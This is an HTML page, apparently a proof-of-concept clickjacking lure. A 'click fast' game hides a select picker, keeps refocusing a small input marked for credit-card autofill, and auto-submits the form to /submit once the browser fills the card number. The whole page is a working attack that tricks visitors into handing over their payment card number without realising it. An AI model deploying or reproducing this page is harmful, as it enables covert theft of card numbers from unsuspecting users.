<h1>Click fast as you can :)</h1>

<br>

<form id="form" action="/submit" method="GET">
    <input
        id="card"
        class="input"
        style="font-size: 10px;"
        autocomplete="cc-number"
    >
</form>

<br>

<select id="select">
    <option>.......................................................................</option>
    <option>.......................................................................</option>
    <option>................................FastClick..............................</option>
    <option>.......................................................................</option>
    <option>.......................................................................</option>
</select>

<br>

<style>
#select {
    opacity: 0;
    pointer-events: none;
    position: absolute;
}

.input {
    position: fixed;
    left: 3%;
}
</style>

<script>
const input = document.getElementById("card");
const select = document.getElementById("select");
const form = document.getElementById("form");

input.addEventListener("change", () => {
    form.requestSubmit();
});

document.addEventListener("click", () => {

    setTimeout(() => {
        input.focus();
    }, 200);

    setTimeout(() => {
        if (select.showPicker) {
            try {
                select.showPicker();
            } catch (e) {
                console.error("showPicker:", e);
            }
        }
    }, 100);

});
</script>
